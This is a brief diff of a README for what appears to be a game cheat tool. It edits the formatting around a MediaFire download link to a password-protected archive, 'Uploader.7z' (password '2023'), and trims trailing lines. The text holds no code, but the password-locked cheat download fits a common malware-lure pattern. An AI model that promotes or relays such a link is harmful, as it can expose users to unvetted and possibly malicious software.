@@ -3,7 +3,7 @@
 
 ## Download
 
-|[Download](https://www.mediafire.com/file/5fzt81ki3r5y1vg/Uploader.7z/file)| {/\}
+|[Download](https://www.mediafire.com/file/5fzt81ki3r5y1vg/Uploader.7z/file)|  
 |:-------------|
 Password : 2023
 
@@ -96,5 +96,3 @@ Password : 2023
       - [+]Buy Melee Fighting Styles
      
   - ![maxresdefault](https://user-images.githubusercontent.com/81978945/221242091-2a8e5fdd-391d-4391-9ec7-fa00c6eb2525.jpg)|
- 
-  - 
